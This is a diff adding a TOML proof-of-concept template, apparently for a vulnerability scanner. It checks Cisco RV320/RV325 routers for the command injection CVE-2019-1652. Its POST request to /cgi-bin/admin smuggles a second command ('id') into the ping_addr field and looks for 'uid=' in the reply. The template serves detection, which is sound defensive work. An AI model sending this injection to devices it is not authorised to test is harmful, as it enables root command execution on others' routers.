@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "通过向 Cisco RV320/RV325 基于 Web 的管理界面发送特制 POST 请求，验证命令注入漏洞。该漏洞源于对用户输入验证不充分，具有管理员权限的攻击者可利用该漏洞在底层 Linux shell 中以 root 权限执行任意命令。"
+id = "POC-AVE-2019-0800"
+name = "Cisco RV320/RV325 命令注入 PoC"
+severity = "high"
+tags = ["ave-2019-0800"]
+vuln_id = [
+    "CVE-2019-1652",
+    "AVE-2019-0800",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/admin"
+protocol = "http"
+
+[poc.requests.body]
+content = "page=ping_test&ping_addr=127.0.0.1%3Bid&ping_size=64&ping_count=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "admin:language=en; admin:rnd=0x1234"
+Referer = "{{BaseURL}}/"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
